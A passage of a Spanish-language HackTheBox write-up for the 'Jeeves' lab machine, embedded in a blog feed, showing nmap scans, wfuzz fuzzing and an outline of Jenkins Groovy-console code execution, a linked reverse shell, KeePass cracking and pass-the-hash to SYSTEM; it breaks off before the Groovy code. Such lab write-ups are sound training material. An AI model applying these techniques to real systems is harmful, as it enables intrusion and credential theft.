&lt;p&gt;Bueno, por ahora no es m√°s que agradecimiento hacia la luna y el atardecer üò¨ Nos leeremos en otra ocasi√≥n yyyyyyyyyyy como siempre, a seguir rompiendo tooooooooodo!!&lt;/p&gt;
</description>
        <pubDate>Sat, 28 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/knife</link>
        <guid isPermaLink="true">http://localhost:4000/htb/knife</guid>
        
        <category>PHP-explotation</category>
        
        <category>knife</category>
        
        <category>chef</category>
        
        <category>sudo</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Jeeves</title>
        <description>&lt;p&gt;M√°quina Windows nivel medio. La elegancia de &lt;strong&gt;Jenkins&lt;/strong&gt; que nos permite jugar con scripts de &lt;strong&gt;Groovy&lt;/strong&gt; para obtener &lt;strong&gt;RCE&lt;/strong&gt; :O Archivos &lt;strong&gt;.kdbx&lt;/strong&gt; con contrase√±as dentro (¬øqu√© puede pasar?) y descubriremos objetos ocultos mediante los &lt;strong&gt;Alternate Data Stream&lt;/strong&gt; (&lt;strong&gt;ADS&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114jeevesHTB.png&quot; alt=&quot;114jeevesHTB&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/2984&quot;&gt;mrb3n&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a estar muy elegantes.&lt;/p&gt;

&lt;p&gt;Empezaremos con un servidor web algo pregunt√≥n, nos moveremos a otro m√°s calmadito con el que fuzzearemos directorios para encontrar recursos fuera de nuestra vista. Llegaremos a un servidor &lt;code&gt;Jenkins&lt;/code&gt; bastaaaaante interesante. Usaremos su consola de scripts para ejecutar c√≥digo -interesante- del lenguaje de programaci√≥n &lt;code&gt;Groovy&lt;/code&gt;. Finalmente obtendremos una &lt;strong&gt;Reverse Shell&lt;/strong&gt; como el usuario &lt;code&gt;kohsuke&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Estando en el sistema encontraremos un archivo &lt;code&gt;.kdbx&lt;/code&gt; (&lt;strong&gt;KeePass Database&lt;/strong&gt;) que contiene tooooooodas las contrase√±as guardadas por &lt;strong&gt;kohsuke&lt;/strong&gt;, pero para poder verlas necesitamos una contrase√±a -maestra-, jugaremos con &lt;code&gt;keepass2john&lt;/code&gt; y &lt;code&gt;john&lt;/code&gt; para crackear la credencial maestra, esto para obtener acceso completo a la base de datos con la herramienta &lt;code&gt;kpcli&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Una de las contrase√±as contiene un backup de unos hashes al dumpear la &lt;code&gt;SAM&lt;/code&gt;, con ayuda de &lt;code&gt;psexec&lt;/code&gt; lograremos probarlos contra el usuario &lt;code&gt;Administrator&lt;/code&gt; y obtener una &lt;strong&gt;terminal&lt;/strong&gt; en el sistema como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Y tendremos que hacer un peque√±o movimiento con los &lt;code&gt;Alternate Data Stream&lt;/code&gt; para encontrar la flag &lt;code&gt;root.txt&lt;/code&gt; oculta en un archivo.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algunas vulns conocidas y cositas reales.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;En las noches fr√≠as.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Recorremos el puerto 80&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-50000&quot;&gt;Recorremos el puerto 50000&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#web-jenkins-found&quot;&gt;Encontramos servidor &lt;strong&gt;Jenkins&lt;/strong&gt; en el puerto &lt;strong&gt;50000&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#jenkins-groovy-scripts&quot;&gt;Usamos instrucciones del lenguaje &lt;strong&gt;Groovy&lt;/strong&gt; para ejecutar comandos en el sistema&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#decrypt-jenkins-secrets&quot;&gt;Intentamos desencriptar los secretos de &lt;strong&gt;Jenkins&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#keepass2john&quot;&gt;Jugamos con el archivo &lt;strong&gt;KeePass&lt;/strong&gt; y obtenemos &lt;strong&gt;master password&lt;/strong&gt; de la base de datos&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#keepass-cracked&quot;&gt;Vemos credenciales del gestor &lt;strong&gt;KeePass&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#psexec&quot;&gt;Usamos &lt;strong&gt;psexec&lt;/strong&gt; para obtener una &lt;strong&gt;terminal&lt;/strong&gt; usando **hashes almacenados en la &lt;u&gt;.kdbx&lt;/u&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ads&quot;&gt;Vemos que la flag esta oculta con un &lt;strong&gt;Alternate Data Stream&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Empezaremos viendo que puertos tiene abiertos la m√°quina, as√≠ vamos direccionando nuestro research, usaremos &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.63 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;El escaneo nos devuelve:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat initScan
# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.63
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.63 ()	Status: Up
Host: 10.10.10.63 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 50000/open/tcp//ibm-db2///	Ignored State: filtered (65531)
# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 204.57 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Nos ofrece un servidor web.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;135/445&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://ayudaleyprotecciondatos.es/2021/03/04/protocolo-smb/&quot;&gt;SMB&lt;/a&gt;&lt;/strong&gt;: Protocolo para compartir informaci√≥n entre dispositivos de una red.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;50000&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ibm-db2: No sabemos a√∫n que esta sirviendo el puerto en concreto.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Bien, ahora que sabemos que puertos hay, vamos a profundizar un poco m√°s y descubrir que scripts y versiones est√°n siendo mantenid@s por cada servicio:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;~(Usando la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.63
    [*] Open ports: 80,135,445,50000

[*] Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;)~&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 80,135,445,50000 -sC -sV 10.10.10.63 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Y este escaneo nos muestra:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat portScan
# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p 80,135,445,50000 -sC -sV -oN portScan 10.10.10.63
Nmap scan report for 10.10.10.63
Host is up (0.11s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h05m37s, deviation: 0s, median: 5h05m36s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-17T21:40:02
|_  start_date: 2021-08-17T21:30:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 48.15 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cositas relevantes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;¬†&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;ul&gt;
  &lt;li&gt;Vemos &lt;code&gt;Ask Jeeves&lt;/code&gt;, es curioso, pero no tenemos a√∫n certeza de que es.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Puerto&lt;/td&gt;
      &lt;td&gt;Servicio&lt;/td&gt;
      &lt;td&gt;Versi√≥n&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;50000&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Jetty 9.4.z-SNAPSHOT&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Esa versi√≥n suena locochona, teng√°mosla en cuenta para m√°s adelante, por ahora no vemos nada m√°s, sigamos.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lindo, encontramos el logo del famoso &lt;a href=&quot;https://es.wikipedia.org/wiki/Ask.com&quot;&gt;Ask&lt;/a&gt; (que su nombre original es &lt;code&gt;Ask Jeeves&lt;/code&gt;), encargado de hacer b√∫squedas en internet (es como un &lt;strong&gt;Google&lt;/strong&gt;), as√≠ que contamos con un motor de b√∫squeda como primera medida.&lt;/p&gt;

&lt;p&gt;Existe un campo en el que podemos escribir cositas para ser buscadas, pero con cualquier t√©rmino nos redirige al recurso &lt;code&gt;error.html&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_SourceHTML_link2errorHTML.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ese recurso tiene esta imagen:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_SourceHTML.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_jeevesPNG.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De ella podemos destacar varias cositas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Microsoft SQL Server 2005 - 9.00.4053&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Una ruta de los archivos de la web: &lt;code&gt;c:\webroot\Sock_Puppets\...&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Y al final unas versiones, tanto de &lt;code&gt;.NET&lt;/code&gt; como de &lt;code&gt;ASP.NET&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;No sabemos si esto nos sirva de algo (por la fecha que tiene el error) pero podemos guardarlo (:&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;puerto-50000&quot;&gt;Puerto 50000 &lt;a href=&quot;#puerto-50000&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Revisando el servicio del puerto &lt;code&gt;50000&lt;/code&gt; encontramos esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Volvemos a ver la referencia hacia &lt;code&gt;Jetty 9.4.z-SNAPSHOT&lt;/code&gt;, as√≠ que busquemos de que trata‚Ä¶&lt;/p&gt;

&lt;p&gt;üöèüöèüöè &lt;strong&gt;&lt;em&gt;&lt;code&gt;Jetty&lt;/code&gt; es un servidor web y contenedor de &lt;u&gt;Servlets&lt;/u&gt; (clases que ayudan a ampliar las capacidades de un servidor) que se enfoca &lt;u&gt;100%&lt;/u&gt; en &lt;code&gt;Java&lt;/code&gt;.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Bien, buscando vulnerabilidades relacionadas con la versi√≥n &lt;code&gt;9.4.z-SNAPSHOT&lt;/code&gt; o &lt;code&gt;9.4&lt;/code&gt; caemos en este post:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638&quot;&gt;Critical Jenkins Server Vulnerability - (CVE-2019-17638)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;üöÄ &lt;strong&gt;&lt;em&gt;‚ÄúJenkins, the open-source automation server software, had a critical vulnerability (CVE-2019-17638) in the &lt;code&gt;Jetty&lt;/code&gt; web server that allowed the leakage of users confidential data.&lt;/em&gt;&lt;/strong&gt;‚Äù &lt;a href=&quot;https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638&quot;&gt;davosnetworks&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;OJOOOOooklajsdl√±f ¬øqu√© es Jenkins? ¬ø? ¬ø? r√°pidamenteeeeeee‚Ä¶&lt;/p&gt;

&lt;p&gt;La idea de &lt;strong&gt;Jenkins&lt;/strong&gt; es supervisar tooooooodas las tareas repetitivas que se realizan en un proyecto, peeeeeero lo hace √©l, eso evita a los programadores estar revisando y revisando problemas o temas relacionados con el c√≥digo. Su definici√≥n es sencilla: &lt;strong&gt;&lt;em&gt;servidor automatizado de integraci√≥n continua&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Les dejo este excelente post donde se habla de que es &lt;strong&gt;Jenkins&lt;/strong&gt; y &lt;strong&gt;la integraci√≥n continua&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://ciberninjas.com/jenkins/&quot;&gt;¬øQu√© es Jenkins?, Herramienta de Integraci√≥n Continua&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Bien, peeeeeeeeeeeeeeero no podemos hacer nada con esa vulnerabilidad que encontramos, ya que tenemos el servidor &lt;strong&gt;Jetty&lt;/strong&gt; pero no el servidor &lt;strong&gt;Jenkins&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;web-jenkins-found&quot;&gt;Encontramos servidor &lt;u&gt;Jenkins&lt;/u&gt; en el puerto &lt;u&gt;50000&lt;/u&gt; &lt;a href=&quot;#web-jenkins-found&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Despu√©s de estar probando cositas, encontramos algo llamativo al fuzzear directorios que la web sostiene, pero fuera de nuestra vista.&lt;/p&gt;

&lt;p&gt;Usaremos &lt;code&gt;wfuzz&lt;/code&gt; pas√°ndole 20 hilos, el wordlist que usara y en que parte la &lt;strong&gt;URL&lt;/strong&gt; queremos que pruebe cada l√≠nea:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± wfuzz -c --hc=404 -t 20 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                        
=====================================================================

000041607:   302        0 L      0 W        0 Ch        &quot;askjeeves&quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;S√∫per leeeeeeejos (el archivo tiene m√°s de 200k l√≠neas) encontr√≥ un recurso llamado &lt;code&gt;askjeeves&lt;/code&gt; (que se relaciona con nuestro servicio en el puerto &lt;strong&gt;80&lt;/strong&gt;), es un redirect, pero ve√°moslo a ver a donde nos lleva:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pos si, tamos en la interfaz del servidor &lt;code&gt;Jenkins&lt;/code&gt;, lo primero llamativo a la vista fue la versi√≥n que esta abajo a la derecha: &lt;code&gt;Jenkins 2.87&lt;/code&gt;, esto nos abre una nueva puerta para buscar vulns.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Indagando un poco en las opciones que nos brinda el servidor, vemos en la parte izquierda una tuerca y el texto &lt;code&gt;Manage Jenkins&lt;/code&gt;, si damos clic recibimos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList1.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList2.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hay varios apartados interesantes, pero de toooooooooodos hay dos muuuuy llamativos: &lt;code&gt;System Information&lt;/code&gt; (info del entorno donde esta montado &lt;strong&gt;Jenkins&lt;/strong&gt;) y &lt;code&gt;Script Console&lt;/code&gt; (permite ejecutar scripts).&lt;/p&gt;

&lt;p&gt;üöÜ &lt;strong&gt;System Information&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;Uff bastantes cositas‚Ä¶ Pero lo m√°s relevante ser√≠a esto:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_systemInfo.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tenemos dos usuarios del sistema y vemos la ruta donde esta el ejecutable de &lt;code&gt;Jenkins&lt;/code&gt; (que esta en una de las carpetas del usuario &lt;strong&gt;Administrator&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;üöÜ &lt;strong&gt;Script Console&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;√âl mismo nos informa que podemos escribir ah√≠:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Type in an &lt;strong&gt;arbitrary &lt;code&gt;Groovy script&lt;/code&gt; and execute it&lt;/strong&gt; on the server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;jenkins-groovy-scripts&quot;&gt;Jugamos con scripts de &lt;u&gt;Groovy&lt;/u&gt; para ejecutar comandos en el sistema &lt;a href=&quot;#jenkins-groovy-scripts&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;‚õ∞Ô∏è &lt;strong&gt;&lt;em&gt;Groovy es un lenguaje de programaci√≥n orientado a objetos implementado sobre la plataforma Java. Groovy usa una sintaxis muy parecida a Java, comparte el mismo modelo de objetos, de hilos y de seguridad.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://es.wikipedia.org/wiki/Groovy_(lenguaje_de_programaci%C3%B3n)&quot;&gt;Wikipedia&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Buscando como usar la consola o ejemplos del lenguaje &lt;code&gt;Groovy&lt;/code&gt;, encontramos este recurso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/&quot;&gt;Exploiting Jenkins Groovy Script Console in Multiple Ways&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El post nos provee directamente un payload para obtener una &lt;strong&gt;Reverse Shell&lt;/strong&gt;, lo extrae de este otro recurso:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76&quot;&gt;https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyRevSH.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Antes de intentarlo quer√≠a mostrarles este otro c√≥digo, con √©l podemos ejecutar comandos en el sistema y ver su respuesta:&lt;/p&gt;
